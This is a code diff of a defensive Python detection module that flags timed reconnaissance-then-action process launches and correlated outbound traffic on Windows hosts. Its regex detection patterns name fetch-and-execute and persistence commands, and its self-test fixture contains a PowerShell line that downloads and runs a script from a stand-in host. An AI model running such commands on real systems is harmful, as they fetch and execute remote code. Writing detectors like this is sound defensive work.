@@ -1,45 +1,16 @@
-"""counter_agentic.py — Counter-Agentic Detection (Code: CAGT).
+"""Advisory evidence for timed discovery/action launches and related network work.
 
-Purpose
-    A cognitive-layer DETECTION module aimed at autonomous, agentic malware —
-    the kind driven by an LLM reasoning loop rather than a fixed script. Instead
-    of matching static hashes or IPs, CAGT looks for the *behavioural signature*
-    of an agent thinking: a recurring inference-latency rhythm between spawned
-    commands, combined with a discovery→action reasoning chain, plus anomalous
-    access to the local model-inference port.
-
-SCOPE — DEFENSIVE DETECTION ONLY
-    This module is deliberately limited to detection and alerting. It does NOT
-    contain — and will not — any offensive/active-response capability. The
-    original specification's weaponized subsystems (semantic tar-pits / prompt-
-    injection payload generation, Economic-Denial-of-Sustainability recursive-
-    junk endpoints, adversarial Unicode/output corruption, and active WFP
-    severing) are intentionally EXCLUDED: they are offensive tooling and out of
-    scope for this project. CAGT raises high-severity events; mitigation
-    decisions are left to the operator-gated SOAR layer.
-
-Signals
-    1. Inference-cadence fingerprinting — successive child-process spawns from
-       one parent separated by the characteristic ~1.5–4.0 s LLM "thinking"
-       pause, repeated.
-    2. Discovery→action chain — the first command in that rhythm is
-       reconnaissance (whoami/net/get-process…) and a later one is an action
-       (iex/download/schtasks/reg…).
-    3. Ollama port watch — sockets with either endpoint matching the configured
-       inference port number, owned by a process without exact-path/digest
-       approval. A port match alone does not establish locality or misuse.
-
-Inputs
-    Consumes process-creation events already on the EventBus (from ETWG / ETWR /
-    Process Monitor) via the ``recent()`` polling pattern; also samples local
-    connections via psutil. Read-only.
-
-Drop-in contract: BaseModule subclass + CODE/NAME/state/health_pct/self_test +
-module-level register().
+Scripts, schedulers and people can produce the same cadence. Live Sysmon
+identity can corroborate a process link. Assess automation, attribution and
+possible command-and-control separately. The inference-port watch is independent.
 """
 from __future__ import annotations
 
-import os
+from collections import OrderedDict, deque
+from datetime import datetime, timezone
+from ipaddress import ip_address
+import math
+import re
 import threading
 import time
 from dataclasses import dataclass
@@ -50,6 +21,7 @@ try:
 except Exception:  # pragma: no cover
     psutil = None
 
+from angerona.core.eventbus import is_remote_observe_only
 from angerona.core.module_base import BaseModule, Severity
 from angerona.core.url_policy import normalize_local_service_base
 from angerona.core.process_allowlist import (
@@ -58,16 +30,72 @@ from angerona.core.process_allowlist import (
 )
 from angerona.telemetry.sensors import list_connections
 
-# The inference-pause window that characterizes an agentic thinking loop.
 _MIN_PAUSE, _MAX_PAUSE = 1.5, 4.0
-_STALE_AFTER = 60.0          # evict a parent's timeline after this idle gap
+_STALE_AFTER = 60.0
+_MAX_LINEAGES = 256
+_MAX_CHILDREN = 1024
+_MAX_EVENTS_PER_POLL = 512
+_MAX_UTC_SECONDS = 253402300799
+_SYSMON = "Sysmon Event Bridge"
+_PROCESS_MODULES = frozenset((
+    "ETW Real-Time Process Sensor", "ETW Core Listener", "Process Monitor",
+))
+_HEX = re.compile(r"[0-9a-f]{64}\Z")
+_GUID = re.compile(r"[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}\Z", re.I | re.ASCII)
+_UTC = re.compile(r"[0-9]{4}-[0-9]{2}-[0-9]{2}[ T][0-9]{2}:[0-9]{2}:[0-9]{2}(?:\.[0-9]{1,6})?\Z")
+_DISCOVERY = re.compile(
+    r"(?<![\w.-])(?:whoami|systeminfo|get-process|get-childitem|tasklist|ipconfig|quser|wmic|"
+    r"arp|dir|ls)(?:\.exe)?(?![\w.-])", re.I | re.ASCII,
+)
+_ACTION = re.compile(
+    r"(?<![\w-])(?:invoke-expression|iex|invoke-webrequest|iwr|new-service|frombase64string|"
+    r"downloadstring|downloadfile|schtasks(?:\.exe)?\s+/(?:create|change|run|delete)|"
+    r"reg(?:\.exe)?\s+(?:add|delete|import))(?![\w.-])", re.I | re.ASCII,
+)
 
-_DISCOVERY_KW = ("whoami", "net ", "net.exe", "systeminfo", "sysinfo",
-                 "get-process", "get-childitem", "tasklist", "ipconfig",
-                 "dir ", " ls ", "arp ", "quser", "wmic")
-_ACTION_KW = ("download", "invoke-expression", "iex", "invoke-webrequest",
-              "iwr", "schtasks", "reg add", "reg.exe add", "new-service",
-              "bitsadmin", "certutil", "-enc", "frombase64string")
+
+def _positive_int(value, maximum):
+    if type(value) is str and 0 < len(value) <= 10 and value.isascii() and value.isdecimal():
+        value = int(value)
+    return value if type(value) is int and 0 < value <= maximum else None
+
+
+def _guid(value):
+    if type(value) is not str or len(value) not in (36, 38):
+        return None
+    value = value[1:-1] if value.startswith("{") and value.endswith("}") else value
+    return value.lower() if _GUID.fullmatch(value) and value != "00000000-0000-0000-0000-000000000000" else None
+
+
+def _phase_tags(command):
+    if type(command) is not str or len(command) > 8192:
+        return ()
+    return tuple(name for name, pattern in (("discovery", _DISCOVERY), ("action", _ACTION))
+                 if pattern.search(command))
+
+
+def _event_utc(value):
+    if type(value) is not str or len(value) > 26 or not _UTC.fullmatch(value):
+        return None
+    try:
+        return datetime.fromisoformat(value).replace(tzinfo=timezone.utc).timestamp()
+    except (OSError, OverflowError, ValueError):
+        return None
+
+
+@dataclass(frozen=True, slots=True)
+class _Spawn:
+    when: float
+    phases: tuple[str, ...]
+    child: tuple
+
+
+@dataclass(slots=True)
+class _ChildNetwork:
+    lineage: tuple
+    started: float
+    dns_at: float | None = None
+    outbound: tuple[float, int, str] | None = None
 
 
 def _socket_advisory_text(value: object, limit: int) -> str:
@@ -114,9 +142,8 @@ class CounterAgenticModule(BaseModule):
     CODE = "CAGT"
     NAME = "Counter-Agentic Detection"
     name = "Counter-Agentic Detection"
-    description = ("Detects autonomous/agentic malware by its inference-cadence "
-                   "rhythm, discovery→action chains, and anomalous inference-port "
-                   "access. Detection-only; no active/offensive response.")
+    description = ("Reviews timed discovery and action launches, corroborated process-linked "
+                   "outbound activity, and unexpected inference-port matches.")
     category = "Detection"
     version = "1.14.0"
 
@@ -125,9 +152,15 @@ class CounterAgenticModule(BaseModule):
     def __init__(self) -> None:
         super().__init__()
         self.state_lock = threading.Lock()
-        # parent_pid -> list[(ts, cmdline)]
-        self.timelines: dict[int, list[tuple[float, str]]] = {}
-        self._alerted: dict[int, float] = {}     # parent_pid -> last alert ts (dedup)
+        self._manager = None
+        self.timelines: OrderedDict[tuple, list[_Spawn]] = OrderedDict()
+        self._chains = {}
+        self._children: OrderedDict[tuple, _ChildNetwork] = OrderedDict()
+        self._alerted: OrderedDict[tuple, float] = OrderedDict()
+        self._observations = deque(maxlen=64)
+        self._behavior_gap = False
+        self._sysmon_live = False
+        self._behavior_binding = None
         self._port_alerted: dict[tuple, float] = {}
         self._detections = 0
         self._agent_integrity_store = None
@@ -149,76 +182,217 @@ class CounterAgenticModule(BaseModule):
         return self.health
 
     # ── bus consumption ──────────────────────────────────────────────────────
-    @staticmethod
-    def _is_proc_event(ev) -> bool:
-        details = getattr(ev, "details", {}) or {}
-        if details.get("event_type") == "process_creation":
-            return True
-        return getattr(ev, "module", "") in (
-            "ETW Real-Time Process Sensor", "ETW Core Listener",
-            "Process Monitor", "PROC", "ETWG", "ETWR")
+    def bind_manager(self, manager):
+        self._manager = manager
+
+    def _sysmon_generation(self):
+        modules = getattr(self._manager, "modules", None)
+        module = modules.get(_SYSMON) if type(modules) is dict else None
+        if ((type(module).__module__, type(module).__name__)
+                != ("angerona.modules.sysmon_listener", "SysmonListenerModule")):
+            return None
+        try:
+            value = module.collection_snapshot()
+        except (OSError, RuntimeError, TypeError, ValueError):
+            return None
+        if (type(value) is not dict or value.get("mode") != "native" or value.get("live") is not True
+                or value.get("source_module") != _SYSMON):
+            return None
+        generation = value.get("generation")
+        return generation if type(generation) is str and _HEX.fullmatch(generation) else None
+
+    def _verified_local(self, event, *, mesh):
+        if is_remote_observe_only(event) or getattr(self._bus, "integrity_enabled", None) is not True:
+            return False
+        signature = getattr(event, "hmac_sig", None)
+        if not mesh and (type(signature) is not str or not _HEX.fullmatch(signature)):
+            return False
+        try:
+            return self._bus.verify(event) is True
+        except (AttributeError, RuntimeError, TypeError, ValueError, OverflowError, RecursionError):
+            return False
 
     def _ingest_bus(self) -> None:
         if self._bus is None:
             return
-        events, _overflow = self.poll_bus_events()
-        for ev in events:
-            if not self._is_proc_event(ev):
+        events, overflow = self.poll_bus_events()
+        mesh = getattr(self._bus, "mesh_required", None) is True
+        generation = self._sysmon_generation() if mesh else None
+        gap = overflow or len(events) > _MAX_EVENTS_PER_POLL
+        binding = self._bus, self.lifecycle_generation
+        new_binding = binding != self._behavior_binding
+        if gap or new_binding:
+            self.timelines.clear()
+            self._chains.clear()
+            self._children.clear()
+        if new_binding:
+            self._behavior_binding = binding
+            self._alerted.clear()
+        with self.state_lock:
+            if new_binding:
+                self._behavior_gap = False
+                self._observations.clear()
+            self._behavior_gap |= bool(gap)
+            self._sysmon_live = generation is not None
+        now = time.time()
+        for event in events[-_MAX_EVENTS_PER_POLL:]:
+            details = getattr(event, "details", None)
+            if type(details) is not dict:
                 continue
-            d = getattr(ev, "details", {}) or {}
-            # Key the rhythm by the PARENT: an agent parent spawns a cadence of
-            # child commands. Fall back to child pid if no ppid is present.
-            parent = d.get("ppid") or d.get("pid")
-            cmd = d.get("cmdline") or d.get("command_line") or d.get("name") or ""
-            if parent is None or not cmd:
+            module = getattr(event, "module", "")
+            eid = details.get("eid")
+            sysmon = module == _SYSMON
+            if sysmon:
+                if (generation is None or details.get("collection_generation") != generation
+                        or details.get("sensor_source") != "sysmon-native"
+                        or details.get("raw_sensor_evidence") is not True
+                        or type(eid) is not int or eid not in (1, 3, 22)):
+                    continue
+            elif module not in _PROCESS_MODULES or details.get("event_type") != "process_creation":
                 continue
-            try:
-                parent = int(parent)
-            except (TypeError, ValueError):
+            if not self._verified_local(event, mesh=mesh):
                 continue
-            self._record(parent, str(cmd), ev.ts)
+            pid = _positive_int(details.get("pid"), 0xFFFFFFFF)
+            stamp = _event_utc(details.get("source_utc_time")) if sysmon else getattr(event, "ts", None)
+            if (pid is None or type(stamp) not in (float, int) or not 0 < stamp <= _MAX_UTC_SECONDS
+                    or not -5 <= now - stamp <= _STALE_AFTER):
+                continue
+            if sysmon:
+                process_guid = _guid(details.get("process_guid"))
+                if process_guid is None:
+                    continue
+                child = (generation, process_guid, pid)
+                if eid != 1:
+                    self._observe_network(child, stamp, eid, details)
+                    continue
+                parent_pid = _positive_int(details.get("parent_pid"), 0xFFFFFFFF)
+                parent_guid = _guid(details.get("parent_process_guid"))
+                if parent_pid is None or parent_pid == pid or parent_guid is None or parent_guid == process_guid:
+                    continue
+                lineage = (_SYSMON, generation, parent_guid, parent_pid)
+                self._record_child(lineage, child, stamp, _phase_tags(details.get("command_line")))
+            else:
+                parent_pid = _positive_int(details.get("ppid"), 0xFFFFFFFF)
+                if parent_pid is None or parent_pid == pid:
+                    continue
+                birth = details.get("process_birth_ticks")
+                if (type(birth) is not str or not 1 <= len(birth) <= 20
+                        or not birth.isascii() or not birth.isdecimal() or not 0 < int(birth) <= 0xFFFFFFFFFFFFFFFF):
+                    birth = details.get("process_create_time")
+                    if type(birth) not in (int, float) or not 0 < birth <= stamp or not math.isfinite(birth):
+                        birth = stamp
+                command = details.get("cmdline")
+                if type(command) is not str or not command:
+                    command = details.get("command_line")
+                self._record_child((module, "", "", parent_pid), (pid, birth), stamp, _phase_tags(command))
 
-    def _record(self, parent_pid: int, cmdline: str, ts: float) -> None:
-        tl = self.timelines.setdefault(parent_pid, [])
-        tl.append((ts, cmdline))
-        if len(tl) > 12:
-            del tl[:-12]                     # keep the recent window bounded
-        self._analyze_rhythm(parent_pid, tl)
-
-    # ── signal 1+2: cadence + discovery→action chain ─────────────────────────
-    def _analyze_rhythm(self, parent_pid: int, timeline: list[tuple[float, str]]) -> None:
+    def _record_child(self, lineage, child, stamp, phases):
+        timeline = self.timelines.get(lineage, [])
+        if timeline and (stamp <= timeline[-1].when or any(row.child == child for row in timeline)):
+            return
+        if lineage[1]:
+            if child in self._children:
+                return
+            self._children[child] = _ChildNetwork(lineage, stamp)
+            if len(self._children) > _MAX_CHILDREN:
+                self._children.popitem(last=False)
+        timeline.append(_Spawn(stamp, phases, child))
+        del timeline[:-12]
+        self.timelines[lineage] = timeline
+        self.timelines.move_to_end(lineage)
+        if len(self.timelines) > _MAX_LINEAGES:
+            evicted, _rows = self.timelines.popitem(last=False)
+            self._chains.pop(evicted, None)
         if len(timeline) < 3:
             return
-        d1 = timeline[-2][0] - timeline[-3][0]
-        d2 = timeline[-1][0] - timeline[-2][0]
+        first, middle, last = timeline[-3:]
+        d1, d2 = middle.when - first.when, last.when - middle.when
         if not (_MIN_PAUSE <= d1 <= _MAX_PAUSE and _MIN_PAUSE <= d2 <= _MAX_PAUSE):
             return
-        if not self._is_contextual_chain(timeline[-3][1], timeline[-2][1], timeline[-1][1]):
+        if "discovery" not in first.phases or not any("action" in row.phases for row in (middle, last)):
             return
-        # Dedup: at most one alert per parent per stale window.
-        now = time.time()
-        if now - self._alerted.get(parent_pid, 0.0) < _STALE_AFTER:
-            return
-        self._alerted[parent_pid] = now
-        self._detections += 1
-        self.emit(
-            f"Agentic loop fingerprint on parent PID {parent_pid}: inference-cadence "
-            f"rhythm ({d1:.1f}s, {d2:.1f}s) with a discovery→action command chain. "
-            f"Possible autonomous/LLM-driven activity — review (detection only).",
-            Severity.HIGH,
-            parent_pid=parent_pid, delta1=round(d1, 2), delta2=round(d2, 2),
-            chain=[timeline[-3][1][:120], timeline[-2][1][:120], timeline[-1][1][:120]],
-            mitre="T1059 / T1082",
-        )
+        self._record_observation(lineage, "discovery-action-cadence", last.when,
+                                 pauses_seconds=(round(d1, 2), round(d2, 2)),
+                                 phases=(first.phases, middle.phases, last.phases))
+        if lineage[1]:
+            self._chains[lineage] = (middle, last)
+            for row in (middle, last):
+                network = self._children.get(row.child)
+                if network is not None:
+                    self._correlate_outbound(row.child, network)
 
-    @staticmethod
-    def _is_contextual_chain(cmd1: str, cmd2: str, cmd3: str) -> bool:
-        """Discovery-then-action reasoning chain: first command is recon, a later
-        command is an action."""
-        c1 = cmd1.lower()
-        later = (cmd2 + " " + cmd3).lower()
-        return (any(k in c1 for k in _DISCOVERY_KW)
-                and any(k in later for k in _ACTION_KW))
+    def _observe_network(self, child, stamp, eid, details):
+        network = self._children.get(child)
+        if network is None or not 0 <= stamp - network.started <= _STALE_AFTER:
+            return
+        if eid == 22:
+            query = details.get("query_name")
+            if type(query) is str and 0 < len(query) <= 253 and query.isprintable():
+                network.dns_at = stamp
+            return
+        port = _positive_int(details.get("dest_port"), 65535)
+        protocol = details.get("protocol")
+        address = details.get("dest_ip")
+        if (details.get("initiated") is not True or port is None or type(protocol) is not str
+                or len(protocol) != 3 or protocol.lower() not in {"tcp", "udp"}
+                or type(address) is not str or not 0 < len(address) <= 64 or "%" in address):
+            return
+        try:
+            destination = ip_address(address)
+        except ValueError:
+            return
+        destination = getattr(destination, "ipv4_mapped", None) or destination
+        if not destination.is_global or destination.is_multicast or destination.is_reserved:
+            return
+        network.outbound = stamp, port, protocol.lower()
+        self._correlate_outbound(child, network)
+
+    def _correlate_outbound(self, child, network):
+        if network.outbound is None or not any(
+            row.child == child and "action" in row.phases for row in self._chains.get(network.lineage, ())
+        ):
+            return
+        stamp, port, protocol = network.outbound
+        self._record_observation(network.lineage, "process-linked-outbound", stamp,
+                                 pid=child[2], process_guid=child[1], destination_port=port, transport=protocol,
+                                 prior_dns_observed=network.dns_at is not None and network.dns_at <= stamp)
+
+    def _record_observation(self, lineage, kind, stamp, **evidence):
+        now = time.time()
+        key = (kind, lineage)
+        prior = self._alerted.get(key)
+        if prior is not None and 0 <= now - prior < _STALE_AFTER:
+            return
+        self._alerted[key] = now
+        self._alerted.move_to_end(key)
+        if len(self._alerted) > 2 * _MAX_LINEAGES:
+            self._alerted.popitem(last=False)
+        module, generation, parent_guid, parent_pid = lineage
+        details = dict(event_type="automation_behavior_observation", observation_kind=kind,
+                       observed_at=stamp, source_module=module, parent_pid=parent_pid,
+                       identity_strength="sysmon-process-guid" if generation else "pid-only",
+                       disposition="observation", active_attack=False, response_authorized=False, **evidence)
+        if generation:
+            details.update(collection_generation=generation, parent_process_guid=parent_guid)
+        if kind == "discovery-action-cadence":
+            details["mitre"] = "T1059 / T1082"
+        with self.state_lock:
+            self._observations.append(details)
+        self._detections += 1
+        message = (f"Discovery and action launches followed a repeated cadence for parent PID {parent_pid}."
+                   if kind == "discovery-action-cadence" else
+                   f"Action child PID {evidence['pid']} had a verified process link to outbound activity.")
+        self.emit(message + " Review the behavior and its coverage.", Severity.HIGH if generation else Severity.MEDIUM,
+                  **details)
+
+    def behavior_snapshot(self):
+        """Copy recent observations and explicit coverage facts from memory."""
+        with self.state_lock:
+            return dict(scope="Local automation behavior observations",
+                        sysmon_identity_available=self._sysmon_live,
+                        bus_coverage_gap=self._behavior_gap,
+                        observations=tuple(dict(row) for row in self._observations),
+                        response_authorized=False)
 
     # ── signal 3: local inference-port watch ─────────────────────────────────
     def _watch_ollama_port(self) -> PortWatchReceipt:
@@ -352,10 +526,14 @@ class CounterAgenticModule(BaseModule):
     # ── housekeeping ─────────────────────────────────────────────────────────
     def _prune(self) -> None:
         now = time.time()
-        stale = [pid for pid, tl in self.timelines.items()
-                 if tl and (now - tl[-1][0]) > _STALE_AFTER]
-        for pid in stale:
-            del self.timelines[pid]
+        stale = [lineage for lineage, timeline in self.timelines.items()
+                 if now - timeline[-1].when > _STALE_AFTER]
+        for lineage in stale:
+            del self.timelines[lineage]
+            self._chains.pop(lineage, None)
+        for key, child in tuple(self._children.items()):
+            if now - child.started > _STALE_AFTER or child.lineage not in self.timelines:
+                del self._children[key]
         for key, ts in list(self._alerted.items()):
             if now - ts > 4 * _STALE_AFTER:
                 del self._alerted[key]
@@ -394,8 +572,7 @@ class CounterAgenticModule(BaseModule):
             )
 
     def run(self) -> None:
-        self.emit("CAGT online — counter-agentic detection (cadence fingerprinting + "
-                  "inference-port watch). Detection-only.", Severity.INFO)
+        self.emit("CAGT online — automation behavior review and inference-port watch.", Severity.INFO)
         while not self.stopping:
             try:
                 self._ingest_bus()
@@ -404,6 +581,8 @@ class CounterAgenticModule(BaseModule):
                 self._check_agent_integrity()
                 if self._agent_integrity_status in {"drift", "unavailable"}:
                     self.set_health(55, "configured agent input integrity requires operator review")
+                elif coverage.complete and self._behavior_gap:
+                    self.set_health(70, "Automation event delivery had a gap. Review observations with incomplete coverage.")
                 elif coverage.complete:
                     self.set_health(
                         100,
@@ -427,8 +606,7 @@ class CounterAgenticModule(BaseModule):
             self.sleep(self._POLL)
 
     def self_test(self) -> tuple[bool, str]:
-        """Offline: a synthetic recon→pause→action cadence must fire; a benign
-        fast/no-chain sequence must not."""
+        """Exercise advisory discovery/action cadence with a benign control."""
         t0 = 1000.0
         agentic = [(t0, "whoami /all"), (t0 + 2.2, "get-process"),
                    (t0 + 4.4, "powershell iex(iwr http://x/a.ps1)")]
@@ -436,33 +614,22 @@ class CounterAgenticModule(BaseModule):
                   (t0 + 0.2, "calc.exe")]
 
         # Drive detection through a throwaway instance with a capture bus.
-        fired = {"n": 0}
+        observed = []
 
         class _Bus:
             def publish(self, ev):
-                if getattr(ev, "severity", 0) >= Severity.HIGH:
-                    fired["n"] += 1
+                observed.append(ev)
 
         probe = CounterAgenticModule()
         probe.bind(_Bus())
-        for ts, cmd in agentic:
-            probe._record(1234, cmd, ts)
-        agentic_fired = fired["n"] >= 1
-
-        fired["n"] = 0
-        probe2 = CounterAgenticModule()
-        probe2.bind(_Bus())
-        for ts, cmd in benign:
-            probe2._record(5678, cmd, ts)
-        benign_quiet = fired["n"] == 0
-
-        chain_ok = (self._is_contextual_chain("whoami", "x", "iex(iwr ...)")
-                    and not self._is_contextual_chain("notepad", "calc", "explorer"))
-        ok = agentic_fired and benign_quiet and chain_ok
-        return ok, ("cadence+chain detection verified (agentic fires, benign quiet, "
-                    "offensive subsystems excluded)" if ok
-                    else f"detection logic failed: agentic={agentic_fired} "
-                         f"benign_quiet={benign_quiet} chain_ok={chain_ok}")
+        for parent, commands in ((1234, agentic), (5678, benign)):
+            for index, (stamp, command) in enumerate(commands):
+                probe._record_child(("fixture", "", "", parent), (index, stamp), stamp, _phase_tags(command))
+        ok = (len(observed) == 1 and observed[0].severity == Severity.MEDIUM
+              and observed[0].details["disposition"] == "observation"
+              and observed[0].details["response_authorized"] is False
+              and "action" not in _phase_tags("schtasks /query"))
+        return ok, ("Advisory cadence and benign control verified" if ok else "Advisory cadence fixture failed")
 
 
 def register() -> CounterAgenticModule:
